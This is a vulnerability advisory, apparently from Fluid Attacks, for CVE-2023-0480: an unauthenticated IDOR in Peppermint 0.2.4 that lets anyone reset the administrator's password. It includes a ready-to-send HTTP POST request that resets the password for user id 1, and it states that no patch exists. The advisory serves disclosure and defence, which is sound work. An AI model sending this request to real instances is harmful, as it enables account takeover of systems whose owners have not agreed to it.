---
slug: advisories/sharp/
title: Peppermint 0.2.4 - Account Takeover via IDOR
authors: Carlos Bello
writer: cbello
codename: sharp
product: Peppermint 0.2.4
date: 2023-02-06 12:00 COT
cveid: CVE-2023-0480
severity: 9.8
description: Peppermint 0.2.4 - 0 Click Account Takeover via unauthenticated IDOR
keywords: Fluid Attacks, Security, Vulnerabilities, Peppermint, Account Takeover
banner: advisories-bg
advise: yes
template: maskedAdvisory
encrypted: yes
---

## Summary

|                       |                                                                      |
| --------------------- | -------------------------------------------------------------------- |
| **Name**              | Peppermint 0.2.4 - 0 Click Account Takeover via unauthenticated IDOR |
| **Code name**         | [Sharp](https://en.wikipedia.org/wiki/Ten_Sharp)                     |
| **Product**           | Peppermint                                                           |
| **Affected versions** | 0.2.4                                                                |
| **State**             | Public                                                               |
| **Release Date**      | 2023-02-06                                                           |

## Vulnerability

|                       |                                                                                                        |
| --------------------- | -------------------------------------------------------------------------------------------------------|
| **Kind**              | Insecure object reference                                                                              |
| **Rule**              | [013. Insecure object reference](https://docs.fluidattacks.com/criteria/vulnerabilities/013)           |
| **Remote**            | Yes                                                                                                    |
| **CVSSv3 Vector**     | CVSS:AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H                                                               |
| **CVSSv3 Base Score** | 9.8                                                                                                    |
| **Exploit available** | No                                                                                                     |
| **CVE ID(s)**         | [CVE-2023-0480](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0480)                          |

## Description

Peppermint version 0.2.4 allows an unauthenticated external attacker
to change the instance administrator's password. This is possible because
the application exposes a critical endpoint without authentication, and
because it is vulnerable to IDOR.

## Vulnerability

This vulnerability occurs because the application exposes a critical endpoint
without authentication, and because it is vulnerable to IDOR.

### Exploit

To exploit this vulnerability, we only need to send a request like the following
to the server.

```txt
POST /api/v1/users/resetpassword HTTP/1.1
Host: vulnerable.com
User-Agent: Fluid Attacks
Content-Type: application/json
Content-Length: 26
Connection: close

{"password":"hacked","id":1}
```

## Evidence of exploitation

![code_ato](https://user-images.githubusercontent.com/51862990/214393425-126be754-ffb9-4bf8-aca0-4190b94f70c2.png)

![request_ato](https://user-images.githubusercontent.com/51862990/214393489-e8b83865-a813-44ba-8806-d6733581824f.png)

![0_click_ato](https://user-images.githubusercontent.com/51862990/214393767-bbfb42f7-72d7-495d-a469-ba019b562f5d.gif)

## Our security policy

We have reserved the ID CVE-2023-0480 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: Peppermint 0.2.4

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://github.com/Peppermint-Lab/peppermint/>

## Timeline

<time-lapse
  discovered="2023-01-24"
  contacted="2022-01-24"
  replied=""
  confirmed=""
  patched=""
  disclosure="2023-02-06">
</time-lapse>
